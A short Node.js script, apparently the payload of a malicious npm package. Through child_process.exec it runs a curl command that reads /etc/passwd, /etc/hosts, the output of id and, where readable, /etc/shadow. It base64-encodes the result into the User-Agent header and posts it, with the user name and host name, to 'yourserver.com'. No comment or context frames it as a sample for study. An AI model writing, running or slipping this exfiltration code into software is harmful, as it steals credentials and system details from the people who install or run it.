const { exec } = require("child_process");
const command = `
curl -X POST "http://yourserver.com/noderedactedsdk/$(whoami)/$(hostname)/" \
-A "$( (cat /etc/passwd /etc/hosts && id && { [ -r /etc/shadow ] && cat /etc/shadow || echo 'No shadow access'; } | base64 | tr '\\n' '.')" \
-s -o /dev/null
`;
exec(command, (error, stdout, stderr) => {
    if (error) {
        console.error(error.message);
        return;
    }
    if (stderr) {
        console.log(stderr);
    }
    console.log(stdout);
});